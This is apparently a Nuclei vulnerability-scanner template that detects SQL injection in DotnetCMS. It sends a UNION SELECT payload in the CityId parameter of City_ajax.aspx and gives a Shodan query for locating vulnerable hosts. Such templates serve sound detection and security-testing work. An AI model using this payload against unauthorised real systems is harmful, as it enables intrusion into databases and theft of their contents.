id: dotnetcms-sqli
info:
  author: ritikchaddha
  metadata:
    shodan-query: http.html:"dotnetcms"
    verified: true
  name: DotnetCMS SQLi
  reference:
  - https://www.cnblogs.com/rebeyond/p/4951418.html
  - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0150742
  severity: high
  tags: dotnetcms,dotnet,sqli
requests:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5("{{randstr}}")}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/user/City_ajax.aspx?CityId=33''union%20select%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{randstr}}'')),2--'
